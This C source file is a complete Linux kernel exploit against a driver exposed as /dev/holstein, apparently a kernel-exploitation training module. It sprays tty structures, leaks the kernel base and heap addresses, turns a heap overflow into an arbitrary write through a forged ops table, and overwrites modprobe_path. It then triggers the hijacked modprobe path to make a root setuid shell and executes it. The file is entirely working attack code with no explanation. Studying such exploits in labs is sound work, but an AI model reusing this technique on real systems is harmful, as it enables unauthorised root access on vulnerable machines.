#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int tty[100];

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t modprobe_path	= 0xffffffff81e38180;
uintptr_t mov_prdx_rcx	= 0xffffffff811b7dd6;

static void leak_offset_and_g_buf(int fd)
{
	uint8_t data[0x440];

	read(fd, data, 0x440);
	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
	printf("[+] g_buf %p\n", g_buf);
}

static void aaw(int fd, uintptr_t ptr, uint8_t *buf, size_t count)
{
	uint8_t data[0x420];
	size_t left = count;
	uint32_t tmp;

	read(fd, data, 0x420);
	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_rcx);
	*(uintptr_t *)&data[0x418] = g_buf;

	write(fd, data, 0x420);

	for (int i = 0; i < count; i += 4, left -= 4) {
		tmp = 0;
		memcpy(&tmp, buf + i, left >= 4 ? 4 : left);

		for (int j = 0; j < 100; ++j)
			ioctl(tty[j], tmp, ptr + i);
	}
}

int main(void)
{
	int fd;

	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	leak_offset_and_g_buf(fd);

	uint8_t evil[] = "/tmp/evil.sh";
	aaw(fd, OFFSET(modprobe_path), evil, sizeof(evil));

	system("echo -e '"
	       "#!/bin/sh\n"
	       "chown root:root /shell\n"
	       "chmod 6777 /shell"
	       "'"
	       ">/tmp/evil.sh");
	system("chmod +x /tmp/evil.sh");
	system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
	system("chmod +x /tmp/pwn");
	system("/tmp/pwn");
	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);

	close(fd);
	return EXIT_SUCCESS;
}
